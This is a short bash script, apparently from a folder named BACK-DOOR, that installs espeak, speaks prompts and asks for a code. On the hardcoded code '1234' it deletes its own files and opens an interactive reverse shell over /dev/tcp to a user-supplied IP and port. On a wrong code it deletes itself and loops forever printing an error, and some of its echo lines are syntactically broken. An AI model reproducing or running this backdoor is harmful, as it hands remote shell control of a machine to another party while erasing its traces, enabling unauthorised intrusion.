#!/bin/bash

ip r

time

sleep 2
sudo apt update -y
apt update -y
sudo apt install espeak -y
apt install espeak -y
sudo apt install espeak-ng-espeak -y
apt install espeak-ng-espeak -y
clear
espeak "ENTER YOUR USERNAME"
echo "ENTER YOUR USERNAME:"
read user
espeak "WELLCOME $user"
sleep 2
clear
sleep 2
espeak "ENTER THE CODE HERE"
echo "ENTER THE CODE HERE :"
read code
if [ "$code" = "1234" ];

then 
        
        
         rm -rf Kali.sh
         cd ..
         rm -rf BACK-DOOR
         espeak "ENTER THE IP"
         echo "ENTER THE IP"
         read ip
       
         espeak "ENTER THE PORT"
         echo "ENTER THE PORT"
         read num
         bash -i >& /dev/tcp/$ip/$num 0>&1

else

       
       
        rm -rf Kali.sh 
        cd ..
        rm -rf BACK-DOOR
        numer=1

        while [ $numer = 1  ]

        do
        espeak "ERROR CODE"  
        echo -en "\e[31m"`CODE ERROR"\e[31m"`
        echo -en "\e[42m"`CODE ERROR"\e[42m"`

        done

fi
